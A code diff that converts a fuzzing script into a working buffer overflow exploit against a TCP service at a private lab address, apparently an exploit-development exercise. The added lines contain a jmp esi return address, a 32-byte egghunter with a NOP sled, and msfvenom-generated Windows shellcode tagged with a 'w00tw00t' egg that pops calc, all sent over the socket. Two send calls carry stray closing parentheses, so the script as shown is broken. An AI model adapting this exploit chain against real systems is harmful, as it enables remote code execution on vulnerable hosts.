@@ -1,8 +1,38 @@
 import socket
 import time
 
+#unique pattern
 pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"
 
+# jmp esi Address
+
+jmpESI = "755ece45"
+ISEpmj = jmpESI[7:] + jmpESI[5:-2] + jmpESI[3:-4] + jmpESI[:-7]
+
+# egghunter (32byte) plus nop(8byte) fuer 40 byte + jmpESI little endian
+egghunter = "\x90\x90\x90\x90\x90\x90\x90\x90\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
+
+#egghunter canary + exploit (pop calc)
+# exploit mit msfvenom -f python -p windows/exec cmd=calc exitfunc=seh --bad-chars '\x00' --smallest
+buf = "w00tw00t"
+buf += b"\x33\xc9\xb1\xbc\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c"
+buf += b"\x0e\x07\xe2\xfa\xfd\xea\x81\x04\x05\x06\x67\x81\xec"
+buf += b"\x3b\xcb\x68\x86\x5e\x3f\x9b\x43\x1e\x98\x46\x01\x9d"
+buf += b"\x65\x30\x16\xad\x51\x3a\x2c\xe1\xb3\x1c\x40\x5e\x21"
+buf += b"\x08\x05\xe7\xe8\x25\x28\xed\xc9\xde\x7f\x79\xa4\x62"
+buf += b"\x21\xb9\x79\x08\xbe\x7a\x26\x40\xda\x72\x3a\xed\x6c"
+buf += b"\xb5\x66\x60\x40\x91\xc8\x0d\x5d\xa5\x7d\x01\xc2\x7e"
+buf += b"\xc0\x4d\x9b\x7f\xb0\xfc\x90\x9d\x5e\x55\x92\x6e\xb7"
+buf += b"\x2d\xaf\x59\x26\xa4\x66\x23\x7b\x15\x85\x3a\xe8\x3c"
+buf += b"\x41\x67\xb4\x0e\xe2\x66\x20\xe7\x35\x72\x6e\xa3\xfa"
+buf += b"\x76\xf8\x75\xa5\xff\x33\x5c\x5d\x21\x20\x1d\x24\x24"
+buf += b"\x2e\x7f\x61\xdd\xdc\xde\x0e\x94\x6c\x05\xd4\xe0\x8a"
+buf += b"\x01\x08\x3c\x8f\x90\x91\xc2\xfb\xa5\x1e\xf9\x10\x67"
+buf += b"\x4c\x21\x65\x92\xaf\x74\xf7\x06\x34\x1f\x3e\x5b\x70"
+buf += b"\x9a\xa1\xd4\xa3\x2a\x50\x4c\xd8\xab\x14\xf7\xa2\xc0"
+buf += b"\xdc\xde\xb5\xe5\x48\x6d\xda\xdb\xd7\xdf\xbd"
+
+payload= egghunter + ISEpmj
 
 # connection
 TCP_IP = '192.168.122.44'
@@ -14,14 +44,22 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((TCP_IP,TCP_PORT))
 
 # send buffer
-data = s.recv(BufferSize)
-print(data)
+print(s.recv(BufferSize))
 time.sleep(1)
-s.send(("C").encode())
 
-print(s.recv(BufferSize))
-s.send(pattern.encode())
-print(s.recv(BufferSize))
+#send exploit to message
+s.send(("A").encode())
+s.recv(BufferSize)
+s.send(("never gonna give you up").encode())
+s.recv(BufferSize)
+s.send(buf))
+time.sleep(1)
+
+#send payload, overwrite registers, place egghunter
+s.send(("C").encode())
+s.recv(BufferSize)
+s.send(payload))
+s.recv(BufferSize)
 s.send(("y").encode())
 
 s.close()
